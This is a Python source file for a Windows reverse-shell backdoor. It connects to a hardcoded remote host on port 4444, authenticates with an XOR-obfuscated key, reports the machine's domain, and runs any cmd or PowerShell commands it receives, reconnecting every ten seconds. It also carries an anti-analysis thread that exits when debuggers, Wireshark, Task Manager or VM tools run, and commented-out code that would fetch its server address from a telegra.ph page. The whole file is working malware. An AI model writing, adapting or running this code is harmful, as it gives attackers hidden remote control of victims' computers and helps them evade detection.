import socket
import sys
import subprocess
import os
import html
import re
import time
from bs4 import BeautifulSoup
import threading
import psutil
import requests
import Crypto.Util.Padding
import base64
current_dir = os.getcwd()
normalized_dir = os.path.normcase(current_dir)
system32_path  = os.path.normcase("C:\\Windows\\System32")
if system32_path in normalized_dir or normalized_dir.startswith(system32_path + "\\"):
    pass
else:
    pass

   # sys.exit(0)
PORT = 4444
AUTH_KEY = "key007"
XOR_KEY = b"b"
RECONNECT_INTERVAL = 10
SOCKET_TIMEOUT = 500

def check():
    while True:
        time.sleep(1)
        monitoring_tools = [
            "wireshark", "processhacker","taskmgr", "fiddler", "procexp",
            "procmon", "sysmon", "ida", "x32dbg", "x64dbg", "ollydbg", "cheatengine",
            "scylla", "scylla_x64", "scylla_x86", "immunitydebugger", "windbg",
            "reshacker", "reshacker32", "reshacker64", "hxd", "ghidra", "lordpe",
            "tcpview", "netmon", "sniffer", "snort", "apimonitor", "radare2", "procdump",
            "dbgview", "de4dot", "detectiteasy", "detectit_easy", "dumpcap", "netcat",
            "bintext", "dependencywalker", "dependencies", "prodiscover", "sysanonymous",
            "netlimiter", "sandboxie", "vmware", "virtualbox", "vmtools", "taskmgr"
        ]
        for proc in psutil.process_iter():
            try:
                process_name = proc.name().lower()
                if any(tool in process_name for tool in monitoring_tools):
                    pass

                    os._exit(0)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
thread3 = threading.Thread(target=check)
thread3.start()

app_data_dir = os.getenv("APPDATA")
file_path = os.path.join(app_data_dir, "config-app.json")
if os.path.exists(file_path):
    pass
else:
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("Hello")

#req = requests.get("https://telegra.ph/123r211-12-19") #https://telegra.ph/123r211-12-19
#soup = BeautifulSoup(req.text, 'html.parser')
#og_description = soup.find('meta', property='og:description')
#if og_description:
 #   command = og_description['content']
  #  data = command.split()
key = b'abc888'
  #  decrypted_bytes = b''
  #  for piece in data:
  #      decoded = base64.b64decode(piece)
   #     decrypted_piece = bytes([b ^ key[i % len(key)] for i, b in enumerate(decoded)])
   #     decrypted_bytes += decrypted_piece
    #decrypted_text = decrypted_bytes.decode('utf-8', errors='ignore')
HOST = "192.0.2.27"#decrypted_text

def xor_encrypt_decrypt(data, key):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
def get_codepage():
    try:
        chcp = subprocess.run("chcp", shell=True, capture_output=True, text=True, timeout=5)
        cp_line = chcp.stdout.strip()
        codepage = ''.join(filter(str.isdigit, cp_line)) or '65001'
        return codepage
    except Exception:
        return '65001'

def run_command(command):
    codepage = get_codepage()
    try:
        if command.lower().startswith("powershell"):
            ps_command = command[10:].strip() if len(command) > 10 else ""
            if not ps_command:
                return "Error"
            result = subprocess.run(
                ["powershell", "-Command", ps_command],
                capture_output=True,
                text=False,
                timeout=30
            )
        else:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=False,
                timeout=30
            )
        try:
            output = result.stdout.decode(f'cp{codepage}', errors='replace')
            output += result.stderr.decode(f'cp{codepage}', errors='replace')
        except Exception:
            output = result.stdout.decode('utf-8', errors='replace')
            output += result.stderr.decode('utf-8', errors='replace')
        return output.strip() or "GOOD"
    except subprocess.TimeoutExpired:
        return "Error: timed out"
    except Exception as e:
        return f"Error: {str(e)}"

def get_domain():
    try:
        result = subprocess.run(
            ["systeminfo"],
            capture_output=True,
            text=True,
            encoding='utf-8',
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if result.returncode != 0:
            return None
        for line in result.stdout.splitlines():
            if "Domain" in line:
                match = re.search(r"Domain:\s*(.+)", line)
                if match:
                    domain = match.group(1).strip()
                    return domain
        return None
    except Exception:
        return None

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(SOCKET_TIMEOUT)
    try:
        client.connect((HOST, PORT))
        return client
    except Exception:
        return None

def authenticate(client):
    try:
        client.send(xor_encrypt_decrypt(AUTH_KEY + "\n", XOR_KEY))
        encrypted_response = client.recv(1024)
        response = xor_encrypt_decrypt(encrypted_response, XOR_KEY).decode('utf-8').strip()
        return "Authentication successful" in response
    except Exception:
        return False

def main():
    domain = get_domain()
    username = domain if domain else "Unknown"
    while True:
        client = connect_to_server()
        if not client:
            time.sleep(RECONNECT_INTERVAL)
            continue
        if not authenticate(client):
            client.close()
            time.sleep(RECONNECT_INTERVAL)
            continue
        try:
            client.send(xor_encrypt_decrypt(username + "\n", XOR_KEY))
        except Exception:
            client.close()
            time.sleep(RECONNECT_INTERVAL)
            continue
        while True:
            try:
                encrypted_data = client.recv(8192)
                if not encrypted_data:
                    break
                data = xor_encrypt_decrypt(encrypted_data, XOR_KEY).decode('utf-8').strip()
                decoded_data = html.unescape(data)
                if decoded_data.lower() == "delete":
                    client.close()
                    os._exit(0)
                    return
                output = run_command(decoded_data)
                client.send(xor_encrypt_decrypt(output + "\n", XOR_KEY))
            except (ConnectionResetError, ConnectionAbortedError, socket.timeout, socket.error):
                break
            except Exception as e:
                try:
                    client.send(xor_encrypt_decrypt(f"Error: {str(e)}\n", XOR_KEY))
                except:
                    break
        try:
            client.close()
        except:
            pass
        time.sleep(RECONNECT_INTERVAL)

if __name__ == "__main__":
    main()

#